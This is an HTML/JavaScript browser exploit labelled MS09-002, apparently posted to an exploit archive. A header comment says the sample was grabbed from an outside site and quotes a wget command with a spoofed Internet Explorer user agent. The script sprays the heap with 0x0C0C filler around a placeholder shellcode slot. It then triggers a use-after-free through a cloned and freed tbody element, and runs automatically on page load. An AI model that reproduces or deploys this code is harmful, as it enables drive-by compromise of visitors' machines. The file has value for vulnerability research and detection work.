&lt;!--
MS09-002
===============================
grabbed from:
wget http://www.chengjitj.com/bbs/images/alipay/mm/jc/jc.html --user-agent=&quot;MSIE 7.0; Windows NT 5.1&quot;

took a little but found it. /str0ke
--&gt;

&lt;script language=&quot;JavaScript&quot;&gt;

var c=&quot;putyourshizhere-unescaped&quot;;

var array = new Array(); 

var ls = 0x100000-(c.length*2+0x01020); 

var b = unescape(&quot;%u0C0C%u0C0C&quot;); 
while(b.length&lt;ls/2) { b+=b;} 
var lh = b.substring(0,ls/2); 
delete b; 

for(i=0; i&lt;0xC0; i++) { 
	array[i] = lh + c;
} 

CollectGarbage();

var s1=unescape(&quot;%u0b0b%u0b0bAAAAAAAAAAAAAAAAAAAAAAAAA&quot;);
var a1 = new Array();
for(var x=0;x&lt;1000;x++) a1.push(document.createElement(&quot;img&quot;));

function ok() { 
	o1=document.createElement(&quot;tbody&quot;); 
	o1.click; 
	var o2 = o1.cloneNode();	
	o1.clearAttributes(); 
	o1=null; CollectGarbage(); 
	for(var x=0;x&lt;a1.length;x++) a1[x].src=s1; 
	o2.click;
}
&lt;/script&gt;&lt;script&gt;window.setTimeout(&quot;ok();&quot;,800);&lt;/script&gt;

